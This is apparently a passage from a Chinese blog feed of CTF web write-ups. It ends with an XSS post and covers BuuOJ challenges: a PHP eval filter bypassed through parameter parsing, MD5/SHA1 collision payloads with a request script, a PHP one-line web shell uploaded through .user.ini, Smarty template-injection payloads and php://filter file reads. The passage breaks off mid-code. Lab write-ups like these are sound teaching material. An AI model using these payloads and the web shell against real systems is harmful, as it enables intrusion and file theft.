class="hljs-string">&quot;var httpRequest = new XMLHttpRequest();httpRequest.open(&#x27;POST&#x27;, &#x27;http://127.0.0.1/api/amount.php&#x27;, true);httpRequest.setRequestHeader(&#x27;Content-type&#x27;,&#x27;application/x-www-form-urlencoded&#x27;);httpRequest.send(&#x27;u=user1&amp;a=10000&#x27;);&quot;</span>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure><h3 id="web333">web333</h3><p>同web331</p><p>XSS篇章暂时结束</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctfshow</tag>
      
      <tag>web</tag>
      
      <tag>xss</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Buuoj WP(Web方向-1)</title>
    <link href="/2022/02/22/blog0003-buuoj-web-wp-1/"/>
    <url>/2022/02/22/blog0003-buuoj-web-wp-1/</url>
    
    <content type="html"><![CDATA[<p>记录一下BuuOJ上刷到的一些题目~</p><span id="more"></span><h2 id="roar-ctf-easy-calc">1、Roar-CTF Easy Calc</h2><p>这题打开界面是一个计算表达式的网页</p><p>首先，检查前端代码，发现前端向后端 calc.php 发送数据部署了WAF</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">    $(<span class="hljs-string">&#x27;#calc&#x27;</span>).submit(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">        $.ajax(&#123;</span><br><span class="javascript">            <span class="hljs-attr">url</span>:<span class="hljs-string">&quot;calc.php?num=&quot;</span>+<span class="hljs-built_in">encodeURIComponent</span>($(<span class="hljs-string">&quot;#content&quot;</span>).val()),</span><br><span class="javascript">            <span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;GET&#x27;</span>,</span><br><span class="javascript">            <span class="hljs-attr">success</span>:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;</span><br><span class="javascript">                $(<span class="hljs-string">&quot;#result&quot;</span>).html(<span class="hljs-string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span><br><span class="hljs-string"><span class="javascript">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="hljs-subst">$&#123;data&#125;</span></span></span><br><span class="hljs-string"><span class="javascript">            &lt;/div&gt;`</span>);</span><br><span class="javascript">            &#125;,</span><br><span class="javascript">            <span class="hljs-attr">error</span>:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">                alert(<span class="hljs-string">&quot;这啥?算不来!&quot;</span>);</span><br><span class="javascript">            &#125;</span><br><span class="javascript">        &#125;)</span><br><span class="javascript">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="javascript">    &#125;)</span><br><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>打开calc.php，发现PHP代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>首先发送一个phpinfo()测试，发现返送回来一个403，基本可以判定部署的WAF/IDS会对url里的参数进行检查，对于含有英文字符的直接屏蔽，只能发送数字和运算符号。</p><h3 id="php请求参数解析漏洞">PHP请求参数解析漏洞</h3><p>利用PHP的请求参数解析漏洞</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">http:<span class="hljs-comment">//node4.buuoj.cn:28838/calc.php?num=phpinfo()</span><br>http:<span class="hljs-comment">//node4.buuoj.cn:28838/calc.php? num=phpinfo()</span><br></code></pre></td></tr></table></figure><p>当发送这两个变量时，都会在PHP内部解析为“num”变量（PHP解析时自动忽略前置空格）</p><p>因此我们利用这招绕过了url上的字母检查，达到PHP内部实现RCE</p><p>同样的例子还有：</p><p>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[出现后，后面的点就不会再被转义了。</p><p>such as：<code>CTF[SHOW.COM</code>=&gt;<code>CTF_SHOW.COM</code></p><p>ban了这么多东西不要紧，我们还是可以利用PHP的内部函数来绕过</p><p>（PHP的原生函数在RCE受限的情况下还是非常有用的，用起来也需要一定的熟练度和脑洞）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">num=var_dump(scandir(chr(<span class="hljs-number">47</span>)))<br>num=var_dump(readfile(chr(<span class="hljs-number">47</span>).chr(<span class="hljs-number">102</span>).chr(<span class="hljs-number">49</span>).chr(<span class="hljs-number">97</span>).chr(<span class="hljs-number">103</span>).chr(<span class="hljs-number">103</span>)))<br></code></pre></td></tr></table></figure><p>成功拿到flag。</p><h3 id="http请求走私">HTTP请求走私</h3><p>我们当然也可以尝试使用HTTP请求走私的方法去绕过url的检查。（主要利用HTTP的分块传输chunked知识点）</p><p>参考资料:</p><p>https://virusday.github.io/2020/11/27/http%E7%BC%96%E7%A0%81%E7%BB%95waf/%E7%BC%96%E7%A0%81%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95waf/</p><p>HTTP请求走私：</p><p>https://websec.readthedocs.io/zh/latest/vuln/httpSmuggling.html</p><p>https://xz.aliyun.com/t/6654#toc-1%5D</p><h2 id="ez_bypassmd5强碰撞">2、Ez_ByPass——MD5强碰撞</h2><p>这道题就是PHP特性题，当然MD5强碰撞还是第一次遇见，在这里记录一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>        <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$id</span>) === md5(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>                <span class="hljs-keyword">if</span> (!is_numeric(<span class="hljs-variable">$passwd</span>))<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span><br>                    &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>                &#125;<br><br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>            &#125;<br>    &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>主要的难点就在于MD5强碰撞，不过已经有现成的脚本（fastcoll_v1.0.0.5.exe 可以在GitHub上找到）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt<br></code></pre></td></tr></table></figure><p>这里附上现成的结果，下次可以直接撸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">id=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%7Eb%12%F5%876u%1Fl%90%A9%96AH%C1%83%7B%B1%D27%DDfuA%10%C6y%CE-%FE%BE%9DH%E1%B3%ED%CE%9F%DB8%CB%E1%C3%12%BB%D3%19%18%27%E0%0D%DC%BDQ%95%EA%8F%1F%DDu%87%21J.%C9%C3%AF%5ER%CE%AD5I%8E%00%D9O%AF%E4%23%22u%F2%F6%17%B4%E0%1C%D5%F7%12%C9%CC0%7D%22%037%1F%FF%7D%2C%93%D6%8F%B4%A0%AFT%05S%C6%D8%609F%8B%7E%EB%F6%E3%1A%E0o%DB%A1%2C%A7<br><br>gg=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%7Eb%12%F5%876u%1Fl%90%A9%96AH%C1%83%7B%B1%D2%B7%DDfuA%10%C6y%CE-%FE%BE%9DH%E1%B3%ED%CE%9F%DB8%CB%E1%C3%12%BBS%1A%18%27%E0%0D%DC%BDQ%95%EA%8F%1F%DD%F5%87%21J.%C9%C3%AF%5ER%CE%AD5I%8E%00%D9O%AF%E4%23%22u%F2v%17%B4%E0%1C%D5%F7%12%C9%CC0%7D%22%037%1F%FF%7D%2C%93%D6%8F%B4%A0%AFT%85R%C6%D8%609F%8B%7E%EB%F6%E3%1A%E0%EF%DB%A1%2C%A<br></code></pre></td></tr></table></figure><p>这里再附一个Python代码，某次又碰到了，但还是没秒出，生气！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># md5</span><br><span class="hljs-comment"># array1 = r&quot;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%9FNC%A6%B0%3Ca9%A6%D9%F52j%E5%07%F7%13%E1%ADn%3D%8A%B7%5D%D27%B6%EE+A4%B5%0D%BF%02%3A%0B%F0%F2K%1A9%C3%1E%96%B7%14%92%9B%88Oh%93%3E%EBb%3C%CB%9B%CB%029a%5D%7B%E1%CA%D2%99%0E%FBs%FD%DFW%A5%EAJ%0A%B8%7EUQ%FBe%16%26%D3Zv7%ECF%DE%E7%EE%25%1EX%F4%98%D8%12%CA.EO%B8%CCU%EEk%10%18%0Ej%9B%C1%C4%0BZ%10%05%3D%29%C1%5E&quot;</span><br><span class="hljs-comment"># array2 = r&quot;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%9FNC%A6%B0%3Ca9%A6%D9%F52j%E5%07%F7%13%E1-n%3D%8A%B7%5D%D27%B6%EE+A4%B5%0D%BF%02%3A%0B%F0%F2K%1A9%C3%1E%16%B8%14%92%9B%88Oh%93%3E%EBb%3C%CB%1B%CB%029a%5D%7B%E1%CA%D2%99%0E%FBs%FD%DFW%A5%EAJ%0A%B8%7EU%D1%FBe%16%26%D3Zv7%ECF%DE%E7%EE%25%1EX%F4%98%D8%12%CA.EO%B8LU%EEk%10%18%0Ej%9B%C1%C4%0BZ%10%85%3D%29%C1%5E&quot;</span><br><br><span class="hljs-comment"># sha1</span><br>array1 = <span class="hljs-string">r&quot;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&quot;</span><br>array2 = <span class="hljs-string">r&quot;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&quot;</span><br><br>url = <span class="hljs-string">&quot;http://1.14.71.254:28577/Level___3.php&quot;</span><br>url_1 = <span class="hljs-string">&quot;http://127.0.0.1&quot;</span><br><br>proxies = &#123;<br>    <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span>,<br>    <span class="hljs-string">&quot;https&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>&#125;<br><br>headers = &#123;<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>&#125;<br><br>cmd = <span class="hljs-string">&quot;array1=&quot;</span>+array1+<span class="hljs-string">&quot;&amp;array2=&quot;</span>+array2<br><br>r = requests.post(url=url,proxies=proxies,data=cmd,headers=headers)<br><br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>第二个绕过点就很简单了，直接利用PHP字符串隐式转数字的特点：<code>password = 1234567a</code>就可以过了。</p><h2 id="suctf-checkin.user.ini-文件上传">3、SUCTF-Checkin(.user.ini 文件上传)</h2><p>打开题目界面，发现这样的场景。</p><p>直接上传正常的文件，我们可以发现可以直接访问到一个upload的目录，在该目录下存在我们上传的文件和一个index.php。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_1.png" /></p><p>首先上传一个简单的测试，基本可以猜测后端会检查文件类型，上传PHP类型等直接解析的文件类型的成功概率不大（尝试一下如php3，phtml等常见绕过文件名）。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_2.png" /></p><p>试着改回jpg看看有没有办法，这回报错说检测到&lt;?的存在。<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_4.png" /></p><p>绕过&lt;?，我们可以直接改成这样的html标签语句。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>($_POST[cmd]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>把文件名改成jpg上传之后，发现返回了文件头检测的报错。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_3.png" /></p><p>填上GIF的文件头<code>GIF89a</code>尝试骗过去，这下传上去了，尝试进入对应目录的index.php，很遗憾，没有文件包含解析漏洞的环节。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_9.png" /></p><p>（补充：其实这里可以当成1.html，传上去，但是rce的时候会被405 Forbidden，其实感觉一个突破点）。</p><p>接下来就是查资料了，直接查到P牛关于.user.ini利用的漏洞。</p><p>php解析的时候，同文件夹的ini文件其实是能影响的。</p><p>接下来，利用auto_prepend_file和auto_append_file这两个设置，我们将.user.ini传上去，再利用文件包含漏洞，成功获得了后门的权限。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_6.png" /></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_7.png" /></p><p>参考wp:</p><p>https://xz.aliyun.com/t/6091</p><h2 id="hctf-admin">4、HCTF-admin</h2><h2 id="ciscn华东南-web11php-ssti">5、CISCN华东南-Web11（PHP SSTI）</h2><p>打开页面，是一个IP-API的使用说明</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_11.png" /></p><p>可以注意到，这里在右上角获取到了我的IP地址，是一个跟后端交互的点，同时注意到这个网页使用的是smarty，基本可以考虑PHP的模板注入。</p><p>首先我们尝试获取相关信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;<span class="hljs-variable">$smarty</span>.version&#125;<span class="hljs-comment">//获取版本信息</span><br></code></pre></td></tr></table></figure><p><img src="C:\Users\chendher\AppData\Roaming\Typora\typora-user-images\image-20220405202653660.png" alt="image-20220405202653660" /></p><p>得到了smarty的版本为3+，在3以上版本的smarty禁止了<code>&#123;php&#125;&#123;/php&#125;</code>标签。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;php&#125;phpinfo();&#123;/php&#125;<br></code></pre></td></tr></table></figure><p>不过我们可以使用其他的标签（这里说起来感觉和XSS有点接近，毕竟都是涉及到Web画面渲染）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&#123;if phpinfo()&#125;&#123;/if&#125;<br>&#123;if readfile(&#x27;/flag&#x27;)&#125;&#123;/if&#125;<br></code></pre></td></tr></table></figure><p>这样我们就可以拿到我们想要的数据了。</p><p>漏洞的成因基本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;./smarty/libs/&#x27;</span> . <span class="hljs-string">&#x27;Smarty.class.php&#x27;</span>);<br>    <span class="hljs-variable">$smarty</span> = <span class="hljs-keyword">new</span> Smarty();<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>    <span class="hljs-variable">$smarty</span>-&gt;display(<span class="hljs-string">&quot;string:&quot;</span>.<span class="hljs-variable">$ip</span>);     <br><span class="hljs-comment">// display函数把标签替换成对象的php变量；显示模板</span><br>&#125;<br></code></pre></td></tr></table></figure><p>SSTI的博客链接推荐：</p><p>https://www.cnblogs.com/bmjoker/p/13508538.html</p><h2 id="bjdctf-不过如此">6、BJDCTF-不过如此</h2><p>前面两个点其实非常简单，基本就是<code>php</code>伪协议文件流来读。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//next.php</span><br>    <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://710ac4b6-c046-4853-83bb-d8ea73eb9217.node4.buuoj.cn:81/?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/convert.base64-encode/resource=next.php<br></code></pre></td></tr></table></figure><p>然后读取到文件，解码之后得到如下的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> preg_replace(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> 